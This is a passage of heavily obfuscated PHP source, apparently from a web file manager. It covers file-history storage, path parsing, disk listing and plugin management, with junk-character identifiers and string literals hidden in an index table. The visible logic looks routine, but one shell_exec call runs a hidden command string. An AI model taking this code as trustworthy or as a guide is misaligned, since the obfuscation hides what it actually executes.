($Ù—°¡º) { self::remove($Øê¿Ú”, $ÜÁóâ»Û); } return $Ù—°¡º; } } return !1; } public static function setDetail($â‚Í‘ş, $¥¼ßşŞ°, $àşæ ‘) { $Ù‹ã¸ˆ¦ =& $_SERVER[ë¦»ºéÌ]; $¾İÏ¶´ô = self::listData($â‚Í‘ş); if (!$¾İÏ¶´ô) { return; } foreach ($¾İÏ¶´ô[$Ù‹ã¸ˆ¦[375]] as $îº®‘¾Ü => $èœ‘¥¼) { if ($èœ‘¥¼[$Ù‹ã¸ˆ¦[403]] == $¥¼ßşŞ°) { $¾İÏ¶´ô[$Ù‹ã¸ˆ¦[375]][$îº®‘¾Ü][$Ù‹ã¸ˆ¦[1212]] = $àşæ ‘; self::saveData($¾İÏ¶´ô[$Ù‹ã¸ˆ¦[1214]], $¾İÏ¶´ô[$Ù‹ã¸ˆ¦[375]]); return !0; } } return !1; } public static function fileInfo($ÇçêÌ¹, $•¶ğ—ÄÏ) { $èúùì²Ğ =& $_SERVER[ë¦»ºéÌ]; $¾®­Å÷ç = self::listData($ÇçêÌ¹); if (!$¾®­Å÷ç) { show_json(LNG($èúùì²Ğ[116]), !1); } $¯òÖ… = $èúùì²Ğ[12]; foreach ($¾®­Å÷ç[$èúùì²Ğ[375]] as $±Èµå‹ª => $“Æ«šú) { if ($“Æ«šú[$èúùì²Ğ[403]] != $•¶ğ—ÄÏ) { continue; } $¯òÖ… = $¾®­Å÷ç[$èúùì²Ğ[1213]] . $“Æ«šú[$èúùì²Ğ[42]]; break; } if (!$¯òÖ…) { show_json(LNG($èúùì²Ğ[116]), !1); } return IO::info($¯òÖ…); } public static function fileOut($ÄÊü–, $ ¿Õ£‘Ø, $Ã °ç¬´ = false) { $‰îÂĞ–ç =& $_SERVER[ë¦»ºéÌ]; $’ÉÇ•…¡ = self::fileInfo($ÄÊü–, $ ¿Õ£‘Ø); $¢¸Ï® =& $GLOBALS[$‰îÂĞ–ç[7]]; $Ã °ç¬´ = isset($¢¸Ï®[$‰îÂĞ–ç[1177]]) && $¢¸Ï®[$‰îÂĞ–ç[1177]] == 1; if (isset($¢¸Ï®[$‰îÂĞ–ç[43]]) && $¢¸Ï®[$‰îÂĞ–ç[43]] == $‰îÂĞ–ç[1215]) { return IO::fileOutImage($’ÉÇ•…¡[$‰îÂĞ–ç[88]], $¢¸Ï®[$‰îÂĞ–ç[1216]]); } IO::fileOut($’ÉÇ•…¡[$‰îÂĞ–ç[88]], $Ã °ç¬´, get_path_this($ÄÊü–)); } public static function listData($‚¯¸âÌ®, $Ü×Şí¬ = true) { $ŒùÁ÷Òê =& $_SERVER[ë¦»ºéÌ]; if ($Ü×Şí¬ && !IO::exist($‚¯¸âÌ®)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($‚¯¸âÌ®, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $±öÓ² = self::pathHistory($‚¯¸âÌ®); $êòÈÛ´† = array($ŒùÁ÷Òê[1214] => $±öÓ² . $ŒùÁ÷Òê[1201], $ŒùÁ÷Òê[1213] => rtrim(get_path_father($±öÓ²), $ŒùÁ÷Òê[8]) . $ŒùÁ÷Òê[8], $ŒùÁ÷Òê[375] => array()); $Áø¶üáè = IO::getContent($êòÈÛ´†[$ŒùÁ÷Òê[1214]]); if ($Áø¶üáè) { $¦Â¯Ñİ£ = json_decode($Áø¶üáè, !0); if (is_array($¦Â¯Ñİ£)) { $êòÈÛ´†[$ŒùÁ÷Òê[375]] = $¦Â¯Ñİ£; } } return $êòÈÛ´†; } private static function saveData($¼ÜÑ´îà, $ÅäÎê™) { $Š‡ö´‡¢ =& $_SERVER[ë¦»ºéÌ]; self::log($Š‡ö´‡¢[1217] . $¼ÜÑ´îà . $Š‡ö´‡¢[81] . count($ÅäÎê™), $Š‡ö´‡¢[736]); if ($ÅäÎê™) { return IO::setContent($¼ÜÑ´îà, json_encode($ÅäÎê™)); } $„Û’ù™ = IO::pathFather($¼ÜÑ´îà); IO::remove($¼ÜÑ´îà); self::clearEmptyFolder($„Û’ù™); return !0; } public static function clearEmptyFolder($ƒÜâûßÂ) { $ä¯›ƒÜÃ =& $_SERVER[ë¦»ºéÌ]; if (trim($ƒÜâûßÂ, $ä¯›ƒÜÃ[8]) == trim(self::$_historyBase, $ä¯›ƒÜÃ[8])) { return; } $ÓÆÂÔ¶ª = IO::pathFather($ƒÜâûßÂ); $Õ”™®¿Í = IO::has($ƒÜâûßÂ, !0); if ($Õ”™®¿Í[$ä¯›ƒÜÃ[214]] > 0 || $Õ”™®¿Í[$ä¯›ƒÜÃ[215]] > 0) { return; } IO::remove($ƒÜâûßÂ); self::clearEmptyFolder($ÓÆÂÔ¶ª); } private static function getBasePath() { $İ‰ø£œÄ =& $_SERVER[ë¦»ºéÌ]; $ôŞó«œ = Model($İ‰ø£œÄ[1218])->get($İ‰ø£œÄ[1219]); if ($ôŞó«œ) { if (!IO::exist($ôŞó«œ)) { IO::mkdir($ôŞó«œ); } if (get_path_this($ôŞó«œ) == $İ‰ø£œÄ[1204]) { $åºñ¦ú» = $İ‰ø£œÄ[1220] . rand_string(8); @rename($ôŞó«œ, get_path_father($ôŞó«œ) . $İ‰ø£œÄ[8] . $åºñ¦ú»); $ôŞó«œ = DATA_PATH . $åºñ¦ú» . $İ‰ø£œÄ[8]; file_put_contents(DATA_PATH . $İ‰ø£œÄ[1221], $İ‰ø£œÄ[12]); Model($İ‰ø£œÄ[1218])->set($İ‰ø£œÄ[1219], $ôŞó«œ); } return $ôŞó«œ; } $ôŞó«œ = DATA_PATH . $İ‰ø£œÄ[1220] . rand_string(8) . $İ‰ø£œÄ[8]; $ôŞó«œ = IO::mkdir($ôŞó«œ); $ôŞó«œ = rtrim($ôŞó«œ, $İ‰ø£œÄ[8]) . $İ‰ø£œÄ[8]; file_put_contents($ôŞó«œ . $İ‰ø£œÄ[1221], $İ‰ø£œÄ[12]); file_put_contents(DATA_PATH . $İ‰ø£œÄ[1221], $İ‰ø£œÄ[12]); Model($İ‰ø£œÄ[1218])->set($İ‰ø£œÄ[1219], $ôŞó«œ); return $ôŞó«œ; } } class KodIO { const KOD_SOURCE = "\x7b\163\157\x75\x72\x63\x65\175"; const KOD_USER_RECYCLE = "\173\x75\x73\x65\x72\122\x65\x63\x79\143\154\145\x7d"; const KOD_USER_FAV = "\x7b\x75\163\x65\162\106\141\x76\x7d"; const KOD_USER_FILE_TAG = "\x7b\165\163\x65\x72\x46\x69\154\x65\124\x61\x67\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\163\x65\162\x46\x69\x6c\x65\x54\x79\x70\x65\175"; const KOD_GROUP_ROOT_SELF = "\173\147\x72\x6f\x75\x70\122\157\x6f\164\123\145\154\x66\175"; const KOD_USER_SHARE = "\173\x75\x73\x65\162\123\150\141\162\x65\x7d"; const KOD_USER_SHARE_LINK = "\x7b\x75\x73\145\x72\123\x68\x61\162\x65\x4c\x69\156\153\175"; const KOD_USER_SHARE_TO_ME = "\173\163\150\141\162\145\124\x6f\x4d\145\x7d"; const KOD_SHARE_ITEM = "\x7b\163\x68\141\162\145\111\164\145\x6d\175"; const KOD_SHARE_LINK = "\173\x73\x68\141\162\145\x49\x74\145\x6d\114\x69\156\153\x7d"; const KOD_SEARCH = "\173\163\145\141\162\143\150\x7d"; const KOD_BLOCK = "\x7b\x62\154\x6f\x63\x6b\175"; const KOD_IO = "\x7b\151\x6f\175"; const KOD_USER_RECENT = "\173\165\x73\x65\162\x52\145\x6e\x63\145\x6e\x74\x7d"; const KOD_USER_DRIVER = "\x7b\x64\x72\151\x76\145\162\x7d"; public static function typeList() { $ƒØ¦ÄŞË =& $_SERVER[ë¦»ºéÌ]; return array($ƒØ¦ÄŞË[1222] => self::KOD_SOURCE, $ƒØ¦ÄŞË[1223] => self::KOD_USER_RECYCLE, $ƒØ¦ÄŞË[1224] => self::KOD_USER_FAV, $ƒØ¦ÄŞË[1225] => self::KOD_USER_FILE_TAG, $ƒØ¦ÄŞË[1226] => self::KOD_USER_FILE_TYPE, $ƒØ¦ÄŞË[1227] => self::KOD_GROUP_ROOT_SELF, $ƒØ¦ÄŞË[1228] => self::KOD_USER_SHARE, $ƒØ¦ÄŞË[1229] => self::KOD_USER_SHARE_LINK, $ƒØ¦ÄŞË[1230] => self::KOD_USER_SHARE_TO_ME, $ƒØ¦ÄŞË[1231] => self::KOD_SHARE_ITEM, $ƒØ¦ÄŞË[1232] => self::KOD_SHARE_LINK, $ƒØ¦ÄŞË[1233] => self::KOD_SEARCH, $ƒØ¦ÄŞË[1234] => self::KOD_BLOCK, $ƒØ¦ÄŞË[1235] => self::KOD_IO, $ƒØ¦ÄŞË[1236] => self::KOD_USER_RECENT, $ƒØ¦ÄŞË[1237] => self::KOD_USER_DRIVER); } public static function parse($ÊâüØ„Ì) { $ÜÉƒÀºë =& $_SERVER[ë¦»ºéÌ]; $ÊâüØ„Ì = self::clear($ÊâüØ„Ì); $‰€–ëÙè = array_values(self::typeList()); preg_match($ÜÉƒÀºë[1238], $ÊâüØ„Ì, $‡å¦±¬Õ); $ØÇ‚š‹˜ = array($ÜÉƒÀºë[425] => !1, $ÜÉƒÀºë[1239] => !1, $ÜÉƒÀºë[422] => !1, $ÜÉƒÀºë[88] => $ÊâüØ„Ì, $ÜÉƒÀºë[1148] => !1, $ÜÉƒÀºë[1147] => $ÜÉƒÀºë[12]); if (is_array($‡å¦±¬Õ) && count($‡å¦±¬Õ) == 5) { $Å‹ª¬Ç = $ÜÉƒÀºë[1240] . $‡å¦±¬Õ[2] . $ÜÉƒÀºë[333]; if (in_array($Å‹ª¬Ç, $‰€–ëÙè)) { $ØÇ‚š‹˜[$ÜÉƒÀºë[1148]] = $‡å¦±¬Õ[1]; $ØÇ‚š‹˜[$ÜÉƒÀºë[43]] = $Å‹ª¬Ç; $ØÇ‚š‹˜[$ÜÉƒÀºë[1241]] = substr($Å‹ª¬Ç, 1, -1); $ØÇ‚š‹˜[$ÜÉƒÀºë[403]] = $‡å¦±¬Õ[3]; } $ØÇ‚š‹˜[$ÜÉƒÀºë[1147]] = $‡å¦±¬Õ[4]; } $­™Ó¡ÜÂ = array($ÜÉƒÀºë[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ØÇ‚š‹˜[$ÜÉƒÀºë[1203]] = in_array($ØÇ‚š‹˜[$ÜÉƒÀºë[43]], $­™Ó¡ÜÂ); return $ØÇ‚š‹˜; } public static function isTruePath($ë‚¿Í‡) { $»Î¾Ï¹ =& $_SERVER[ë¦»ºéÌ]; if (substr($ë‚¿Í‡, 0, 1) != $»Î¾Ï¹[1240]) { return !0; } if (strpos($ë‚¿Í‡, $»Î¾Ï¹[411]) === 0) { return !0; } if (strpos($ë‚¿Í‡, $»Î¾Ï¹[1207]) === 0) { return !0; } if (strpos($ë‚¿Í‡, $»Î¾Ï¹[1242]) === 0) { return !0; } if (strpos($ë‚¿Í‡, $»Î¾Ï¹[1243]) === 0) { return !0; } if (strpos($ë‚¿Í‡, $»Î¾Ï¹[1244]) === 0) { return !0; } return !1; } public static function clear($£àº”ë®) { $ğ¹‚éÆ› =& $_SERVER[ë¦»ºéÌ]; $£àº”ë® = str_replace(array($ğ¹‚éÆ›[1058], $ğ¹‚éÆ›[18]), $ğ¹‚éÆ›[63], $£àº”ë®); $£àº”ë® = str_replace($ğ¹‚éÆ›[108], $ğ¹‚éÆ›[8], $£àº”ë®); $ãˆ¥óÑ = $ğ¹‚éÆ›[1245]; if (substr($£àº”ë®, 0, 3) == $ğ¹‚éÆ›[1246]) { $£àº”ë® = substr($£àº”ë®, 3); } while (strstr($£àº”ë®, $ãˆ¥óÑ)) { $£àº”ë® = str_replace($ãˆ¥óÑ, $ğ¹‚éÆ›[8], $£àº”ë®); } $£àº”ë® = preg_replace($ğ¹‚éÆ›[1247], $ğ¹‚éÆ›[8], $£àº”ë®); if ($£àº”ë® == $ğ¹‚éÆ›[8]) { return $ğ¹‚éÆ›[8]; } $£àº”ë® = rtrim($£àº”ë®, $ğ¹‚éÆ›[8]); return $£àº”ë®; } public static function sourceID($ü¹”ÙªÏ) { $ÅŞ—¹Ù» =& $_SERVER[ë¦»ºéÌ]; $ëûíÆûÃ = self::parse($ü¹”ÙªÏ); if ($ëûíÆûÃ[$ÅŞ—¹Ù»[43]] !== self::KOD_SOURCE) { show_json(LNG($ÅŞ—¹Ù»[1248]), !1); } return $ëûíÆûÃ[$ÅŞ—¹Ù»[403]]; } public static function make($Í»ÑıŸÃ) { if (!$Í»ÑıŸÃ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($Í»ÑıŸÃ)); } public static function makeShare($é²Ø¤Û¦, $íÔ›ï¶¼) { return self::makePath(self::KOD_SHARE_ITEM, $é²Ø¤Û¦, $íÔ›ï¶¼); } public static function makeFileTypePath($Ş×Øª´Ø) { return self::makePath(self::KOD_USER_FILE_TYPE, $Ş×Øª´Ø); } public static function makeFileTagPath($ÚùÈ‹Š¡) { return self::makePath(self::KOD_USER_FILE_TAG, $ÚùÈ‹Š¡); } public static function makePath($ÂèüçİÂ, $“º¶éíÍ = '', $¬ƒô„ú = '') { $Å”à«± =& $_SERVER[ë¦»ºéÌ]; $™É‰ìÀ = substr($ÂèüçİÂ, 1, -1); $çÜĞôÎä = $Å”à«±[1249] . $™É‰ìÀ . $Å”à«±[1250] . $“º¶éíÍ . $Å”à«±[1251]; $çÜĞôÎä = $¬ƒô„ú ? $çÜĞôÎä . $¬ƒô„ú . $Å”à«±[8] : $çÜĞôÎä; return $çÜĞôÎä; } public static function hashPath($ù–—üÑú, $²Ğƒ˜üĞ = true) { $¸’“…Ş¡ =& $_SERVER[ë¦»ºéÌ]; $İÖ¥Šæú = is_array($ù–—üÑú) ? $ù–—üÑú : IO::info($ù–—üÑú); $ô®¶»ˆŠ = _get($İÖ¥Šæú, $¸’“…Ş¡[1252], $¸’“…Ş¡[12]); if (!$ô®¶»ˆŠ && isset($İÖ¥Šæú[$¸’“…Ş¡[405]])) { $İÖ¥Šæú = IO::info(KodIO::make($İÖ¥Šæú[$¸’“…Ş¡[405]])); $ô®¶»ˆŠ = _get($İÖ¥Šæú, $¸’“…Ş¡[1252], $¸’“…Ş¡[12]); } if (!$ô®¶»ˆŠ && $²Ğƒ˜üĞ) { $ÅêÏµÍ© = KodIO::parse($İÖ¥Šæú[$¸’“…Ş¡[88]]); if (!$ÅêÏµÍ©[$¸’“…Ş¡[43]]) { $ô®¶»ˆŠ = IO::hashSimple($İÖ¥Šæú[$¸’“…Ş¡[88]]); } } if (!$ô®¶»ˆŠ) { $ô®¶»ˆŠ = md5($İÖ¥Šæú[$¸’“…Ş¡[88]] . $İÖ¥Šæú[$¸’“…Ş¡[90]] . $İÖ¥Šæú[$¸’“…Ş¡[96]]); } return $ô®¶»ˆŠ; } public static function initSystemPath() { $ˆÜ€±ìÔ =& $_SERVER[ë¦»ºéÌ]; if (defined($ˆÜ€±ìÔ[1253])) { return; } define($ˆÜ€±ìÔ[1253], self::systemPath($ˆÜ€±ìÔ[1254])); define($ˆÜ€±ìÔ[1255], self::systemPath($ˆÜ€±ìÔ[1256])); define($ˆÜ€±ìÔ[1257], self::systemPath($ˆÜ€±ìÔ[1258])); define($ˆÜ€±ìÔ[1259], self::systemPath($ˆÜ€±ìÔ[1260])); IOHistory::bindEvent(); } public static function systemPath($ÎÀ·‘¤á) { $‡ä…ºı— =& $_SERVER[ë¦»ºéÌ]; $€ã¦Û¶ú = $‡ä…ºı—[1261] . ucfirst($ÎÀ·‘¤á); $™¤ë‹ì = Model($‡ä…ºı—[754])->get($€ã¦Û¶ú); if ($™¤ë‹ì) { return $™¤ë‹ì; } if ($ÎÀ·‘¤á == $‡ä…ºı—[1254]) { $™¤ë‹ì = self::make(Model($‡ä…ºı—[809])->systemRootPathAdd($‡ä…ºı—[539])); } else { $™¤ë‹ì = self::systemPath($‡ä…ºı—[1254]); $¿Æåàò = self::sourceID($™¤ë‹ì); $™¤ë‹ì = self::make(Model($‡ä…ºı—[809])->mkdir($¿Æåàò, $ÎÀ·‘¤á)); } Model($‡ä…ºı—[754])->set($€ã¦Û¶ú, $™¤ë‹ì); return $™¤ë‹ì; } public static function systemFolder($¦è´Òçù) { $Åä×ç¤ = IO_PATH_SYSTEM_SOURCE . $¦è´Òçù; $Ç­á×÷ = Cache::get($Åä×ç¤); if (!$Ç­á×÷) { $ÈìÄß° = IO::infoFull($Åä×ç¤); if (!$ÈìÄß°) { $Ç­á×÷ = IO::mkdir($Åä×ç¤, REPEAT_SKIP); } else { $Ç­á×÷ = $ÈìÄß°[$_SERVER[ë¦»ºéÌ][88]]; } Cache::set($Åä×ç¤, $Ç­á×÷, 3600 * 10); } return $Ç­á×÷; } public static function defaultDriver() { return Model($_SERVER[ë¦»ºéÌ][751])->defaultDriver(); } public static function defaultIO() { $Õã„Ç‹¾ =& $_SERVER[ë¦»ºéÌ]; $›—øåìû = self::defaultDriver(); return $Õã„Ç‹¾[1262] . $›—øåìû[$Õã„Ç‹¾[403]] . $Õã„Ç‹¾[1251]; } public static function defaultDriverInit() { static $ñ’İÏ‰õ = false; if ($ñ’İÏ‰õ) { return $ñ’İÏ‰õ; } $ñ’İÏ‰õ = IO::init(self::defaultIO()); return $ñ’İÏ‰õ; } public static function fileTypeList() { $Î‡­Ñ¿ =& $_SERVER[ë¦»ºéÌ]; $Ãó§ò¥ä = $GLOBALS[$Î‡­Ñ¿[6]][$Î‡­Ñ¿[1263]]; foreach ($Ãó§ò¥ä as $Ï«ç„†¬ => $¬Ïô“Ç•) { $ëïÂÁğ = $Î‡­Ñ¿[1264] . $Ï«ç„†¬; $×ù ÂºÂ = LNG($ëïÂÁğ); if ($ëïÂÁğ != $×ù ÂºÂ) { $Ãó§ò¥ä[$Ï«ç„†¬][$Î‡­Ñ¿[42]] = $×ù ÂºÂ; } } return $Ãó§ò¥ä; } public static function diskList($ÚÖÃğ˜‰ = true) { $î•ã´‰ = $_SERVER[ë¦»ºéÌ][1265]; if ($ÚÖÃğ˜‰) { $Ê³®íèı = Cache::get($î•ã´‰); if (is_array($Ê³®íèı)) { return $Ê³®íèı; } } $Ê³®íèı = self::diskListGet(); Cache::set($î•ã´‰, $Ê³®íèı, 60); return $Ê³®íèı; } public static function diskListGet() { $ãâĞÕ¤„ =& $_SERVER[ë¦»ºéÌ]; $õº³Ê¢§ = array(); if ($GLOBALS[$ãâĞÕ¤„[6]][$ãâĞÕ¤„[1266]] == $ãâĞÕ¤„[1267]) { $âğ±´Š = $ãâĞÕ¤„[1268]; for ($Ú÷è£ëÍ = 0; $Ú÷è£ëÍ < strlen($âğ±´Š); $Ú÷è£ëÍ++) { $úş¾Å¬Ó = $âğ±´Š[$Ú÷è£ëÍ] . $ãâĞÕ¤„[1269]; if (file_exists($úş¾Å¬Ó)) { $õº³Ê¢§[] = $úş¾Å¬Ó; } } return $õº³Ê¢§; } if (!function_exists($ãâĞÕ¤„[109])) { $õº³Ê¢§[] = $ãâĞÕ¤„[819]; return $õº³Ê¢§; } $»ì§¯İ¥ = explode($ãâĞÕ¤„[18], shell_exec($ãâĞÕ¤„[1270])); array_shift($»ì§¯İ¥); array_pop($»ì§¯İ¥); $¡Õıü—ò = array($ãâĞÕ¤„[1271], $ãâĞÕ¤„[1272], $ãâĞÕ¤„[1273], $ãâĞÕ¤„[1274], $ãâĞÕ¤„[1275], $ãâĞÕ¤„[1276], $ãâĞÕ¤„[1277], $ãâĞÕ¤„[1278]); foreach ($»ì§¯İ¥ as $ßù¸Ô¶‘) { $áâ×©’È = preg_split($ãâĞÕ¤„[1279], $ßù¸Ô¶‘); $úş¾Å¬Ó = $áâ×©’È[count($áâ×©’È) - 1]; if (!strstr($áâ×©’È[0], $ãâĞÕ¤„[1280]) || !$úş¾Å¬Ó) { continue; } $û“­ûÊë = rtrim($úş¾Å¬Ó, $ãâĞÕ¤„[8]) . $ãâĞÕ¤„[8]; if (in_array($û“­ûÊë, $¡Õıü—ò)) { continue; } $õº³Ê¢§[] = $û“­ûÊë; } return $õº³Ê¢§; } public static function isSameDisk($¢ùå± ”, $ºÒòØô) { $åªÒ©¯ =& $_SERVER[ë¦»ºéÌ]; if ($GLOBALS[$åªÒ©¯[6]][$åªÒ©¯[1266]] == $åªÒ©¯[1267]) { return strtolower(substr($¢ùå± ”, 0, 1)) == strtolower(substr($ºÒòØô, 0, 1)); } $êÇªáœ = self::diskList(); $æÛËğ‘¦ = !1; $ä¸Û¾ = !1; sort($êÇªáœ); $êÇªáœ = array_reverse($êÇªáœ); $¢ùå± ” = rtrim($¢ùå± ”, $åªÒ©¯[8]) . $åªÒ©¯[8]; $ºÒòØô = rtrim($ºÒòØô, $åªÒ©¯[8]) . $åªÒ©¯[8]; foreach ($êÇªáœ as $¿­ªÑıª) { $ïµ’¿îò = strlen($¿­ªÑıª); if (!$æÛËğ‘¦ && substr($¢ùå± ”, 0, $ïµ’¿îò) == $¿­ªÑıª) { $æÛËğ‘¦ = $¿­ªÑıª; } if (!$ä¸Û¾ && substr($ºÒòØô, 0, $ïµ’¿îò) == $¿­ªÑıª) { $ä¸Û¾ = $¿­ªÑıª; } if ($æÛËğ‘¦ && $ä¸Û¾) { break; } } return $æÛËğ‘¦ === $ä¸Û¾; } public static function transferType($âç”ÌË´, $¨õå•Ô÷) { $œ­ôÔ÷Í =& $_SERVER[ë¦»ºéÌ]; $´€ÍŠÇÑ = self::driverType($âç”ÌË´); $§ü²ë = self::driverType($¨õå•Ô÷); if ($´€ÍŠÇÑ[$œ­ôÔ÷Í[43]] == $§ü²ë[$œ­ôÔ÷Í[43]] && $´€ÍŠÇÑ[$œ­ôÔ÷Í[1281]] == $§ü²ë[$œ­ôÔ÷Í[1281]]) { return $œ­ôÔ÷Í[1282]; } if ($´€ÍŠÇÑ[$œ­ôÔ÷Í[43]] == $œ­ôÔ÷Í[848] && $§ü²ë[$œ­ôÔ÷Í[43]] == $œ­ôÔ÷Í[117]) { return $œ­ôÔ÷Í[1177]; } if ($´€ÍŠÇÑ[$œ­ôÔ÷Í[43]] == $œ­ôÔ÷Í[117] && $§ü²ë[$œ­ôÔ÷Í[43]] == $œ­ôÔ÷Í[848]) { return $œ­ôÔ÷Í[118]; } return $œ­ôÔ÷Í[1283]; } public static function driverType($“é¸¦şÕ) { $Šİ†Ó« =& $_SERVER[ë¦»ºéÌ]; $Ø³œ¸±® = str_replace($Šİ†Ó«[1284], $Šİ†Ó«[12], strtolower($“é¸¦şÕ->getType())); if ($Ø³œ¸±® == $Šİ†Ó«[742] || $Ø³œ¸±® == $Šİ†Ó«[1285] || $Ø³œ¸±® == $Šİ†Ó«[1286]) { $“é¸¦şÕ = self::defaultDriverInit(); } else { if ($Ø³œ¸±® == $Šİ†Ó«[1184] || $Ø³œ¸±® == $Šİ†Ó«[1287]) { $“é¸¦şÕ = IO::init($“é¸¦şÕ->pathParse[$Šİ†Ó«[1131]]); } } $ƒ®èÛÓ· = $“é¸¦şÕ->path; $Ø³œ¸±® = str_replace($Šİ†Ó«[1284], $Šİ†Ó«[12], strtolower($“é¸¦şÕ->getType())); if ($Ø³œ¸±® == $Šİ†Ó«[117]) { return array($Šİ†Ó«[43] => $Šİ†Ó«[117], $Šİ†Ó«[1281] => $Šİ†Ó«[12], $Šİ†Ó«[88] => $ƒ®èÛÓ·); } return array($Šİ†Ó«[43] => $Šİ†Ó«[848], $Šİ†Ó«[1281] => $“é¸¦şÕ->pathDriver, $Šİ†Ó«[88] => $ƒ®èÛÓ·); } public static function pathDriverType($îÃ£ö´) { return $îÃ£ö´ ? self::driverType(IO::init($îÃ£ö´)) : !1; } } goto aÖ˜¥Îƒƒ¿; CèÉ¿‹È–: class PluginModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\x6d\56\x70\x6c\165\x67\x69\156\114\x69\x73\164"; public $field = array("\156\141\x6d\x65", "\163\164\x61\x74\165\x73", "\x72\145\x67\x69\x65\163\164", "\x63\157\x6e\146\x69\147"); public function loadList($à–ôó“Í = false) { $ÑĞâ†ı„ = array_to_keyvalue($this->listData(), $_SERVER[ë¦»ºéÌ][42]); if ($à–ôó“Í) { return $ÑĞâ†ı„[$à–ôó“Í]; } return $ÑĞâ†ı„; } public function init() { $¬±›Âù¾ =& $_SERVER[ë¦»ºéÌ]; Hook::trigger($¬±›Âù¾[1917]); $ÎŞı“²« = $this->loadPluginList(); foreach ($ÎŞı“²« as $¤£Àœ¢¬ => $×¾¦ğ”Ã) { $ß™÷ÅÙš = $this->appAllow($¤£Àœ¢¬, $×¾¦ğ”Ã); if (!$ß™÷ÅÙš) { continue; } foreach ($×¾¦ğ”Ã[$¬±›Âù¾[1918]] as $÷ÔªìÄ => $ğ©®‰“Ç) { Hook::bind($÷ÔªìÄ, $ğ©®‰“Ç); } } Hook::trigger($¬±›Âù¾[1919]); Hook::trigger(ACTION); } public function appAllow($Ï¸Şä“¸, $‚ÅÀöşÉ, $òò›‚è = true) { $Š­î“œ¡ =& $_SERVER[ë¦»ºéÌ]; $İÁ»åµ¬ = PLUGIN_DIR . $Ï¸Şä“¸ . $Š­î“œ¡[1920]; if (!is_array($‚ÅÀöşÉ) || !is_array($‚ÅÀöşÉ[$Š­î“œ¡[1918]]) || $‚ÅÀöşÉ[$Š­î“œ¡[734]] != 1 || !is_file($İÁ»åµ¬)) { return !1; } if ($GLOBALS[$Š­î“œ¡[507]] == 1) { return !0; } if ($òò›‚è && !Action($Š­î“œ¡[1921])->checkAuth($Ï¸Şä“¸)) { return !1; } return !0; } public function unInstall($¾ÑŠşì°) { $òëÑß¢½ =& $_SERVER[ë¦»ºéÌ]; $Ò˜ã†€¬ = $this->loadList($¾ÑŠşì°); if (file_exists(PLUGIN_DIR . $¾ÑŠşì°)) { Hook::apply($¾ÑŠşì° . $òëÑß¢½[1922]); } $this->remove($Ò˜ã†€¬[$òëÑß¢½[403]]); } public function changeStatus($ÔÃ÷º¡ª, $÷‹ÒêÙı) { $÷µ×ĞÂ =& $_SERVER[ë¦»ºéÌ]; $Êª±Ô¢… = $this->loadList($ÔÃ÷º¡ª); if ($÷‹ÒêÙı) { Hook::apply($ÔÃ÷º¡ª . $÷µ×ĞÂ[1923]); } $this->update($Êª±Ô¢…[$÷µ×ĞÂ[403]], array($÷µ×ĞÂ[1924] => $÷‹ÒêÙı)); } public function appRegist($Äø€Ğ…Ğ, $¼„ßá ´) { $Ú“µÄ =& $_SERVER[ë¦»ºéÌ]; $¢„î»à¬ = $this->loadList($Äø€Ğ…Ğ); if ($¢„î»à¬) { $this->update($¢„î»à¬[$Ú“µÄ[403]], array($Ú“µÄ[1918] => $¼„ßá ´)); } else { $©ÜÖ½Ô’ = array($Ú“µÄ[42] => $Äø€Ğ…Ğ, $Ú“µÄ[1918] => $¼„ßá ´, $Ú“µÄ[734] => 0, $Ú“µÄ[6] => $this->getConfigDefault($Äø€Ğ…Ğ)); $this->insert($©ÜÖ½Ô’); } } public function getConfigDefault($¢¡Ô¥ö) { $üØ·„ =& $_SERVER[ë¦»ºéÌ]; $è°©ƒÎ¬ = array(); $´ìÔÍÓ = $this->getPackageJson($¢¡Ô¥ö); if (!$´ìÔÍÓ && is_array($´ìÔÍÓ[$üØ·„[1925]])) { return $è°©ƒÎ¬; } foreach ($´ìÔÍÓ[$üØ·„[1925]] as $ ™˜µª => $Ó¥Øô Ø) { if (!isset($Ó¥Øô Ø[$üØ·„[380]]) || isset($è°©ƒÎ¬[$ ™˜µª])) { continue; } $è°©ƒÎ¬[$ ™˜µª] = $Ó¥Øô Ø[$üØ·„[380]]; } return $è°©ƒÎ¬; } public function getPackageJson($ßø†¥¸) { return Hook::apply($ßø†¥¸ . $_SERVER[ë¦»ºéÌ][1926]); } public function getConfig($¾Ã™µ–ä, $‡ùˆœ¯Û = false) { $Ö‘Ê›ºÑ =& $_SERVER[ë¦»ºéÌ]; $ØêİÉÇ– = array(); $Õ†ÇêÍ‡ = $this->loadList($¾Ã™µ–ä); if ($Õ†ÇêÍ‡ && is_array($Õ†ÇêÍ‡[$Ö‘Ê›ºÑ[6]])) { $ØêİÉÇ– = $Õ†ÇêÍ‡[$Ö‘Ê›ºÑ[6]]; } if (!$ØêİÉÇ– || $‡ùˆœ¯Û) { $ØêİÉÇ– = $this->getConfigDefault($¾Ã™µ–ä); } return $ØêİÉÇ–; } public function setConfig($Šè÷æû», $æòÆÉú— = false) { $›ªşßî» =& $_SERVER[ë¦»ºéÌ]; $Ú…»½¡… = $this->loadList($Šè÷æû»); if (!$Ú…»½¡…) { return !1; } $ÁÌ«Â—Ï = $Ú…»½¡…[$›ªşßî»[6]]; if ($æòÆÉú— == !1) { $ÁÌ«Â—Ï = array(); $æòÆÉú— = $this->getConfigDefault($Šè÷æû»); } foreach ($æòÆÉú— as $¯±ì—ìö => $ñ±‰İœŒ) { $ÁÌ«Â—Ï[$¯±ì—ìö] = is_string($ñ±‰İœŒ) ? trim($ñ±‰İœŒ) : $ñ±‰İœŒ; } $this->update($Ú…»½¡…[$›ªşßî»[403]], array($›ªşßî»[6] => $ÁÌ«Â—Ï)); } public function viewList() { $“¸ÄÃ =& $_SERVER[ë¦»ºéÌ]; $ùˆ²Å› = $this->loadList(); $this->pluginScan($ùˆ²Å›); $ùˆ²Å› = $this->loadPluginList(); $ÊµœŸıÛ = array(); foreach ($ùˆ²Å› as $´šä …¼ => $œÌœğ¡ô) { unset($œÌœğ¡ô[$“¸ÄÃ[1918]], $œÌœğ¡ô[$“¸ÄÃ[6]]); $ı€¡±Ê = PLUGIN_DIR . $œÌœğ¡ô[$“¸ÄÃ[42]] . 